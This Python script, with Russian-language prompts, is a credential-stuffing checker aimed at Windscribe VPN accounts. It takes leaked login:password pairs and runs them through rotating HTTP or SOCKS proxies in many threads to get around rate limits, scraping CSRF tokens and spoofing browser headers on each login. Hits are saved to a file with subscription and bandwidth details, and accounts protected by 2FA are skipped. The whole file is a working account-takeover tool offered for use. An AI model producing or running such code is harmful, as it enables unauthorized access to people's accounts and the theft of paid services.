import time
import requests
from bs4 import BeautifulSoup
from loguru import logger
from random import choice
from threading import Thread
import config
global PROXE
global ACCOUNTS

with open("accounts.txt", "r", encoding="utf-8") as file:
    data = file.read().split("\n")




class Winscribe():
    def __init__(self, UserChoice, Link):
        self.host = "https://rus.windscribe.com"
        self.Link = Link
        self.UserChoice = UserChoice

    def ScrapProxy(self):
        while True:
            try:
                r = requests.get(self.Link)
                with open("config/proxies.txt", "w", encoding="utf-8") as file: file.write(str(r.text))
                proxylen = str(r.text).split('\n')
                logger.success(f"Обновил список прокси: {len(proxylen)} проксей")
                time.sleep(6)
            except Exception as ex:
                time.sleep(2)

    def check_proxy(self):
            try:
                while True:

                    with open("config/proxies.txt", "r", encoding="utf-8") as file:
                        proxy = file.read().split("\n")

                    RandomProxy = choice(proxy)

                    proxyDict = {}
                    if self.UserChoice == 1:
                        proxyDict = {
                            "http": "http://" + RandomProxy,
                            "https": "http://" + RandomProxy,
                        }
                    elif self.UserChoice == 2:
                        proxyDict = {
                            "http": "socks5://" + RandomProxy,
                            "https": "socks5://" + RandomProxy,
                        }

                    elif self.UserChoice == 2:
                        proxyDict = {
                            "http": "socks4://" + RandomProxy,
                            "https": "socks4://" + RandomProxy,
                        }

                    ip = requests.get("https://api64.ipify.org?format=json", proxies=proxyDict)

                    if int(ip.status_code) == 200:
                        return proxyDict

            except: pass

    def start(self):
        try:
            while True:
                info = choice(data)

                login = info.split(":")[0]
                password = info.split(":")[1]

                valid_proxy = self.check_proxy()

                WhatRetry = self.check(valid_proxy, login, password)



                if WhatRetry == True:
                    data.remove(info)

                elif WhatRetry == False:
                    data.remove(info)

                elif WhatRetry == "retry":
                    continue

        except Exception as ex:
            pass

    def check(self, proxy_list, username, password):
        try:


            req = requests.Session()

            headers = {
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                'content-length': '0',
                'origin': 'https://windscribe.com',
                'referer': 'https://windscribe.com/',
                'sec-ch-ua': '"Chromium";v="94", "Google Chrome";v="94", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36',
            }

            r = req.post('https://res.windscribe.com/res/logintoken',
                         headers=headers, proxies=proxy_list, timeout=2).json()
            token = r['csrf_token']
            time = r['csrf_time']

            data = {
                'login': '1',
                'upgrade': '0',
                'csrf_time': time,
                'csrf_token': token,
                'username': username,
                'password': password,
                'code': ''
            }

            headers1 = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                'cache-control': 'max-age=0',
                'content-length': '144',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://windscribe.com',
                'referer': 'https://windscribe.com/login',
                'sec-ch-ua': '"Chromium";v="94", "Google Chrome";v="94", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36'
            }

            t = req.post('https://windscribe.com/login', data=data,
                         headers=headers1, proxies=proxy_list, timeout=2)

            if 'My Account - Windscribe' in t.text:
                p = req.get('https://windscribe.com/myaccount', proxies=proxy_list, timeout=2)

                username = p.text.split('<h2>Username</h2>\n<span>')[1].split('</span>')[0]
                creation_date = p.text.split( 'Account</a></h2>\n<span>')[1].split('</span>')[0]
                account_status = p.text.split('<span id="ma_account_status">\n<strong>')[ 1].split('<')[0]

                bandwith = p.text.split('<h2>Bandwidth Usage</h2>\n<span>')[1].split('</span>')[0]
                bandwith = bandwith.replace('\n', '')

                fa_status = p.text.split('<span id="ma_account_2fa_status">\n<strong>')[1].split('</strong>')[0]

                comparer = p.text.replace('"', '')


                if 'Disabled' in fa_status and "ma_account_status').html('<i class=ma_green_star></i> <strong>Pro</strong>" in comparer:

                    with open('config/valid.txt', 'a', encoding='utf-8', errors='ignore') as g:
                        g.writelines(f'{username}:{password} - User: {username} - Creation: {creation_date} - Status: {account_status} - Bandwith: {bandwith}\n')

                    logger.success(f'{username}:{password} - User: {username} - Creation: {creation_date} - Status: {account_status} - Bandwith: {bandwith}\n')

                    return True


                elif not "ma_account_status').html('<i class=ma_green_star></i> <strong>Pro</strong>" in comparer and 'Disabled' in fa_status:
                    with open('config/valid.txt', 'a', encoding='utf-8', errors='ignore') as g:
                        g.writelines( f'{username}:{password} - User: {username} - Creation: {creation_date} - Status: {account_status} - Bandwith: {bandwith}\n')

                    logger.success(f'{username}:{password} - User: {username} - Creation: {creation_date} - Status: {account_status} - Bandwith: {bandwith}\n')

                    return True



                elif not 'Disabled' in fa_status:
                    with open('config/bad.txt', 'a', encoding='utf-8', errors='ignore') as g:
                        g.writelines(f'username: {username} | password: {password} | bad 2fa\n')

                    return False

                return True



            elif 'Login is not correct' in t.text:
                return False

            elif 'Login attempt limit reached' in t.text:
                return "retry"

            elif "Rate limited, please wait before trying to login again" in t.text:
                return  "retry"

            if len(t.text) > 50:
                with open("test/html.html", "w", encoding="utf-8") as file: file.write(str(t.text))

        except Exception as ex:
            return "retry"



def winscribe():
    try:
        UserChoice = int(input("Выберите вид прокси:\n1 - HTTP / HTTPS\n2 - SOCKS5\n3 - SOCKS4\n\nВведите цифру: "))
        Link =  input("Введите прямую ссылку с прокси: ")
        ThreadChoice = int(input("Потоков: "))

        Bot = Winscribe(UserChoice, Link)

        Thread(target=Bot.ScrapProxy).start()
        for i in range(0, ThreadChoice):
            Thread(target=Bot.start).start()

    except: pass



if __name__ == "__main__":
    winscribe()

#                text = f"login: {self.login} | password: {self.password} | reg_date: {reg_date} | status: {status} | next_reset: {next_reset} | trafic: {trafic}\n"
#                logger.success(f"Успешно найден валидный аккаунт\nreg_date: {reg_date}\nstatus: {status}\nnext_reset: {next_reset}\ntrafic: {trafic}")
#                with open("config/valid.txt", "a+", encoding="utf-8") as file: file.write(text)
#                return True